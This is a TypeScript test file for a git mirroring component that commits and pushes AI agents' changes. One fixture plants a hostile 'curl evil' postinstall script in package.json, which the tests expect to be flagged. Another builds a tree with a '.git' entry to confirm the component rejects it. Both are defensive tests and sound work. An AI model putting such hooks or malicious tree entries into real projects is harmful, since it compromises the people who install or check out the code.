import { execFile } from 'node:child_process';
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { promisify } from 'node:util';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { TaskId } from '../../domain/ids';
import type { RepositoryRef } from '../../ports/access';
import { FsBlobStore } from '../blobs/fs-blob-store';
import { GitMirrors } from './git-mirrors';
import type { GitRemote } from '../../ports/publishing';
import { LocalRemotes } from './remotes';
import { httpGitServer } from './testing/http-git-server';

const run = promisify(execFile);
const IDENTITY = {
  GIT_AUTHOR_NAME: 't',
  GIT_AUTHOR_EMAIL: 't@t',
  GIT_COMMITTER_NAME: 't',
  GIT_COMMITTER_EMAIL: 't@t',
};
const git = async (cwd: string, ...args: string[]) =>
  (await run('git', args, { cwd, env: { ...process.env, ...IDENTITY } })).stdout.trim();

let dir: string;
let origin: string;
let mirrors: GitMirrors;
let blobs: FsBlobStore;
const repository: RepositoryRef = { host: 'local', name: 'origin.git', baseBranch: 'main' };
const taskId = TaskId('task-1');

const reachable = (remote: GitRemote) => Promise.resolve({ ok: true as const, value: remote });

/** The change agent-host would leave: one commit on the base, as a bundle at its ref. */
const agentChange = async (base: string, edit: (work: string) => Promise<void>) => {
  const work = path.join(dir, `work-${String(Math.random()).slice(2)}`);
  await run('git', ['clone', '-q', origin, work]);
  await git(work, 'checkout', '-q', base);
  await edit(work);
  await git(work, 'add', '-A');
  const tree = await git(work, 'write-tree');
  const head = await git(work, 'commit-tree', tree, '-p', base, '-m', 'change');
  await git(work, 'update-ref', 'refs/redline/change', head);
  const bundle = path.join(work, 'change.bundle');
  await git(work, 'bundle', 'create', bundle, 'refs/redline/change', `^${base}`);
  const writer = blobs.writer();
  await writer.write(
    new Uint8Array(await import('node:fs/promises').then((fs) => fs.readFile(bundle))),
  );
  const { digest } = await writer.commit();
  return { blob: digest, head };
};

beforeEach(async () => {
  dir = await mkdtemp(path.join(tmpdir(), 'redline-mirrors-'));
  origin = path.join(dir, 'origin.git');
  const seed = path.join(dir, 'seed');
  await mkdir(seed);
  await git(seed, 'init', '-q', '-b', 'main');
  await writeFile(path.join(seed, 'Card.css'), '.card { }\n');
  await writeFile(
    path.join(seed, 'package.json'),
    JSON.stringify({ scripts: { build: 'vite build' } }),
  );
  await mkdir(path.join(seed, '.redline'));
  await writeFile(path.join(seed, '.redline/receiver.yaml'), 'setup: { run: pnpm install }\n');
  await git(seed, 'add', '.');
  await git(seed, 'commit', '-qm', 'base');
  await run('git', ['clone', '-q', '--bare', seed, origin]);
  blobs = new FsBlobStore(path.join(dir, 'blobs'));
  mirrors = new GitMirrors({
    root: path.join(dir, 'mirrors'),
    remotes: new LocalRemotes(dir),
    identity: { name: 'Redline', email: 'bot@redline.invalid' },
    blobs,
  });
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

describe('GitMirrors', () => {
  it('pins the base branch for a task, and keeps it pinned as the branch moves on', async () => {
    const prepared = await mirrors.prepare(repository, taskId);
    if (!prepared.ok) throw new Error(prepared.error.detail);
    const base = prepared.value.baseSha;
    expect(base).toBe(await git(origin, 'rev-parse', 'main'));
    expect(await mirrors.fileAt(repository, base, '.redline/receiver.yaml')).toBe(
      'setup: { run: pnpm install }',
    );
    expect(await mirrors.fileAt(repository, base, 'missing.txt')).toBeNull();
    expect(await mirrors.prepare({ ...repository, host: 'elsewhere' }, taskId)).toMatchObject({
      ok: false,
      error: { transient: false },
    });
    // A base branch the repository does not have will not appear on a retry.
    expect(
      await mirrors.prepare({ ...repository, baseBranch: 'gone' }, TaskId('task-gone')),
    ).toMatchObject({
      ok: false,
      error: { transient: false, detail: expect.stringContaining('no branch gone') as string },
    });
  });

  it('gives a sandbox a working copy of the base, without a remote', async () => {
    const prepared = await mirrors.prepare(repository, taskId);
    if (!prepared.ok) throw new Error(prepared.error.detail);
    const target = path.join(dir, 'unpacked');
    await mkdir(target);
    const archive = await mirrors.workingCopy(repository, taskId);
    const tar = run('tar', ['-C', target, '-xf', '-']);
    archive.pipe(tar.child.stdin as NodeJS.WritableStream);
    await tar;
    expect(await git(target, 'rev-parse', 'HEAD')).toBe(prepared.value.baseSha);
    expect(await git(target, 'remote')).toBe('');
    expect(await git(target, 'status', '--porcelain')).toBe('');
  });

  it('describes a change, commits it the same way every time and pushes it once', async () => {
    const prepared = await mirrors.prepare(repository, taskId);
    if (!prepared.ok) throw new Error(prepared.error.detail);
    const base = prepared.value.baseSha;
    const change = await agentChange(base, async (work) => {
      await writeFile(path.join(work, 'Card.css'), '.card { align-items: stretch; }\n.grid { }\n');
      await writeFile(
        path.join(work, 'package.json'),
        JSON.stringify({ scripts: { build: 'vite build', postinstall: 'curl evil' } }),
      );
      await writeFile(path.join(work, 'run.sh'), '#!/bin/sh\n', { mode: 0o755 });
    });

    const described = await mirrors.describe(repository, base, change);
    if (!described.ok) throw new Error(described.error.detail);
    expect(described.value.entries).toEqual([
      {
        path: 'Card.css',
        previousPath: null,
        status: 'modified',
        mode: 'file',
        binary: false,
        bytes: 42,
        addedLines: 2,
        removedLines: 1,
      },
      expect.objectContaining({ path: 'package.json', status: 'modified' }),
      {
        path: 'run.sh',
        previousPath: null,
        status: 'added',
        mode: 'executable',
        binary: false,
        bytes: 10,
        addedLines: 1,
        removedLines: 0,
      },
    ]);
    expect(described.value.scriptChanges).toEqual([
      { path: 'package.json', scripts: ['postinstall'] },
    ]);

    const commit = {
      taskId,
      baseSha: base,
      change,
      message: 'Make the cards equal height',
      at: 1_762_000_000_000,
    };
    const first = await mirrors.commit(repository, commit);
    const again = await mirrors.commit(repository, commit);
    if (!first.ok || !again.ok) throw new Error('commit failed');
    expect(again.value.sha).toBe(first.value.sha);

    const profile = { target: 'branch' as const, draft: true };
    expect(await mirrors.push(repository, profile, first.value.sha, 'redline/task-1')).toEqual({
      ok: true,
      value: undefined,
    });
    expect(await git(origin, 'rev-parse', 'redline/task-1')).toBe(first.value.sha);
    // A retry finds it there; a different commit is refused.
    expect(
      await mirrors.push(repository, profile, first.value.sha, 'redline/task-1'),
    ).toMatchObject({ ok: true });
    expect(await mirrors.push(repository, profile, base, 'redline/task-1')).toMatchObject({
      ok: false,
      error: { transient: false },
    });
  });

  it('refuses a bundle whose objects git would not accept, before any of them is stored', async () => {
    const prepared = await mirrors.prepare(repository, taskId);
    if (!prepared.ok) throw new Error(prepared.error.detail);
    const base = prepared.value.baseSha;
    // A tree with a `.git` entry: what a checkout would turn into the repository's own config.
    const work = path.join(dir, 'hostile');
    await run('git', ['clone', '-q', origin, work]);
    await writeFile(path.join(work, 'config'), '[core]\n');
    const blob = await git(work, 'hash-object', '-w', 'config');
    const { stdout } = await run(
      'sh',
      ['-c', `printf '100644 blob ${blob}\\t.git\\n' | git mktree`],
      { cwd: work },
    );
    const hostileTree = stdout.trim();
    const head = await git(work, 'commit-tree', hostileTree, '-p', base, '-m', 'change');
    await git(work, 'update-ref', 'refs/redline/change', head);
    const bundle = path.join(work, 'change.bundle');
    await git(work, 'bundle', 'create', bundle, 'refs/redline/change', `^${base}`);
    const writer = blobs.writer();
    await writer.write(new Uint8Array(await readFile(bundle)));
    const change = { blob: (await writer.commit()).digest, head };
    expect(await mirrors.describe(repository, base, change)).toMatchObject({
      ok: false,
      error: { transient: false },
    });
    await expect(git(mirrors.mirrorOf(repository), 'cat-file', '-e', head)).rejects.toThrow();
  });

  it('reads a file at a commit, tells a missing one apart, and never takes a failure for one', async () => {
    const prepared = await mirrors.prepare(repository, taskId);
    if (!prepared.ok) throw new Error(prepared.error.detail);
    const base = prepared.value.baseSha;
    expect(await mirrors.fileAt(repository, base, 'Card.css')).toBe('.card { }');
    expect(await mirrors.fileAt(repository, base, 'Missing.css')).toBeNull();
    await expect(mirrors.fileAt(repository, 'f'.repeat(40), 'Card.css')).rejects.toThrow();
  });

  it('takes only one commit on the task’s base as a change', async () => {
    const prepared = await mirrors.prepare(repository, taskId);
    if (!prepared.ok) throw new Error(prepared.error.detail);
    const base = prepared.value.baseSha;
    const change = await agentChange(base, (work) => writeFile(path.join(work, 'a.txt'), 'a'));
    const otherBase = 'f'.repeat(40);
    expect(await mirrors.describe(repository, otherBase, change)).toMatchObject({ ok: false });
    const writer = blobs.writer();
    await writer.write(new TextEncoder().encode('not a bundle'));
    const { digest } = await writer.commit();
    expect(
      await mirrors.describe(repository, base, { blob: digest, head: change.head }),
    ).toMatchObject({ ok: false, error: { transient: false } });
    // A bundle is taken only with the commit the run named.
    expect(
      await mirrors.describe(repository, base, { ...change, head: 'e'.repeat(40) }),
    ).toMatchObject({ ok: false, error: { transient: false } });
  });

  it('reaches a host over HTTPS with a header made for each call, and keeps no credentials', async () => {
    const authorization = `Basic ${Buffer.from('x-access-token:ghs_secret').toString('base64')}`;
    const server = await httpGitServer(dir, authorization);
    try {
      const remote = { url: `${server.url}/origin.git`, authorization };
      const viaHttp = new GitMirrors({
        root: path.join(dir, 'http-mirrors'),
        remotes: { source: () => reachable(remote), target: () => reachable(remote) },
        identity: { name: 'Redline', email: 'bot@redline.invalid' },
        blobs,
      });
      const prepared = await viaHttp.prepare(repository, taskId);
      if (!prepared.ok) throw new Error(prepared.error.detail);
      const change = await agentChange(prepared.value.baseSha, (work) =>
        writeFile(path.join(work, 'b.txt'), 'b'),
      );
      const commit = { taskId, baseSha: prepared.value.baseSha, change, message: 'm', at: 0 };
      const committed = await viaHttp.commit(repository, commit);
      if (!committed.ok) throw new Error(committed.error.detail);
      expect(
        await viaHttp.push(
          repository,
          { target: 'branch', draft: true },
          committed.value.sha,
          'redline/task-1',
        ),
      ).toEqual({
        ok: true,
        value: undefined,
      });
      expect(await git(origin, 'rev-parse', 'redline/task-1')).toBe(committed.value.sha);
      expect(server.seen.filter((header) => header === authorization).length).toBeGreaterThan(0);
      // Nothing about the host stays in the mirror.
      const mirrorConfig = await readFile(
        path.join(dir, 'http-mirrors/local/origin.git.git/config'),
        'utf8',
      );
      expect(mirrorConfig).not.toContain('ghs_secret');
      expect(mirrorConfig).not.toContain(server.url);

      const refused = new GitMirrors({
        root: path.join(dir, 'refused-mirrors'),
        remotes: {
          source: () => reachable({ ...remote, authorization: null }),
          target: () => reachable(remote),
        },
        identity: { name: 'Redline', email: 'bot@redline.invalid' },
        blobs,
      });
      expect(await refused.prepare(repository, taskId)).toMatchObject({
        ok: false,
        error: { transient: true },
      });
    } finally {
      server.close();
    }
  });
});
